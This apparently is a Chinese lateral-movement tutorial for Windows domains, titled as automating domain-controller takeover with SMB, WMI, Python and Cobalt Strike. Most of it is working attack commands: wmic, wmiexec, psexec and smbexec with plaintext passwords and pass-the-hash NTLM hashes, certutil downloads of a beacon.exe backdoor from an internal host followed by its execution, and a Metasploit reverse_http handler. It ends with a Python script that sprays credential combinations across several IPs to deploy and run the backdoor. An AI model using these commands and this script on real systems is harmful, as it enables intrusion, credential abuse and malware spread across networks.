# 内网安全——横向移动SMB&WMI&PY配合CS全自动拿域控

# 资源地址

1. [impacket](https://github.com/SecureAuthCorp/impacket)

2. [impacket-examples-windows](https://github.com/maaaaz/impacket-examples-windows)

3. [pstools](https://docs.microsoft.com/en-us/sysinternals/downloads/pstools)

# WMI横向-cscript&wmiexec&wmic

1. WMI是通过135端口进行利用，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。

2. wmic

   - 内部：(单执行)

     ``` powershell
     wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe" #构造一个文件下载，下载CS后门到C盘，后面的URL为后门下载地址
     
     wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create "cmd.exe c:/beacon.exe" #执行CS后门
     ```

2. cscript

   - 内置：(交互式)

     上传wmiexec.vbs

     ``` powershell
     cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345
     ```

3. wmiexec

   - 外部：(交互式&单执行)

     ``` powershell
     wmiexec ./administrator:admin!@#45@192.168.3.32 "whoami"
     
     wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami"
     ```

   - 下载后门：

     ``` powershell
     wmiexec ./administrator:admin!@#45@192.168.3.32 "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"
     ```

   - 执行后门：

     ``` powershell
     shell wmiexec ./administrator:admin!@#45@192.168.3.32 "cmd.exe /c c:/beacon.exe"
     ```

# SMB横向-psexec&smbexec&services

1. 利用SMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放。

2. psexec

   - 内部：(交互式 windows官方工具)

     ``` powershell
     psexec64 \\192.168.3.32 -u administrator -p admin!@#45 -s cmd
     ```

   - 外部：(交互式 内网外人开发的工具)

     ``` powershell
     psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
     ```

   - 引用MSF回显反弹接受CMD

     ``` powershell
     use exploit/multi/handler
     
     set payload windows/meterpreter/reverse_http
     
     spawn msf
     ```

3. smbexec

   - 外部：(交互式)

     ``` powershell
     smbexec ./administrator:admin!@#45@192.168.3.32
     
     smbexec god/administrator:admin!@#45@192.168.3.32
     
     smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
     
     smbexec -hashes :518b98ad4178a53695dc997aa02d455c 
     
     god/administrator@192.168.3.32smbexec -hashes 
     
     god/administrator:518b98ad4178a53695dc997aa02d455c@192.168.3.32
     ```

4. services

   - 内置：(单执行)

     ``` powershell
     services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 create -name shell -display shellexec -path C:\Windows\System32\shell.exe
     
     services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 start -name shell
     ```

# CS全自动横向-SMB内置&WMI脚本Py

1. CS全自动看演示操作

2. Py脚本编译上传执行

   ``` python
   import os,time
   
   ips={
   
       '192.168.3.21',
   
       '192.168.3.25',
   
       '192.168.3.29',
   
       '192.168.3.30',
   
       '192.168.3.32'
   
   }
   
   users={
   
       'Administrator',
   
       'boss',
   
       'dbadmin',
   
       'fileadmin',
   
       'mack',
   
       'mary',
   
       'webadmin'
   
   }
   
   passwords={
   
       'admin!@#45',
   
       'Admin12345'
   
   }
   
   
   
   def down():
   
       for ip in ips:
   
           for user in users:
   
               for p in passwords:
   
                   #wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"
   
                   #wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create "cmd.exe c:/beacon.exe"
   
                   #wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 "whoami"
   
                   exec = "wmic /node:"+ip+" /user:administrator /password:"+p+' process call create "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"'
   
                   exec1 = "wmic /node:" + ip + " /user:god\\"+user+" /password:" + p + ' process call create "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"'
   
                   #exec1= "wmiexec -hashes :"+mimahash+" ./"+user+"@"+ip+" whoami"
   
                   print('--->' + exec + '<---')
   
                   print('--->' + exec1 + '<---')
   
                   os.system(exec)
   
                   os.system(exec1)
   
                   time.sleep(0.5)
   
   
   
   def exec():
   
       for ip in ips:
   
           for user in users:
   
               for p in passwords:
   
                   #wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"
   
                   #wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create "cmd.exe c:/beacon.exe"
   
                   #wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 "whoami"
   
                   exec = "wmic /node:"+ip+" /user:administrator /password:"+p+' process call create "cmd.exe /c c:/beacon.exe"'
   
                   exec1 = "wmic /node:" + ip + " /user:god\\"+user+" /password:" + p + ' process call create "cmd.exe /c c:/beacon.exe"'
   
                   #exec1= "wmiexec -hashes :"+mimahash+" ./"+user+"@"+ip+" whoami"
   
                   print('--->' + exec + '<---')
   
                   print('--->' + exec1 + '<---')
   
                   os.system(exec)
   
                   os.system(exec1)
   
                   time.sleep(0.5)
   
   if __name__ == '__main__':
   
       down()
   
       exec()
   ```

   

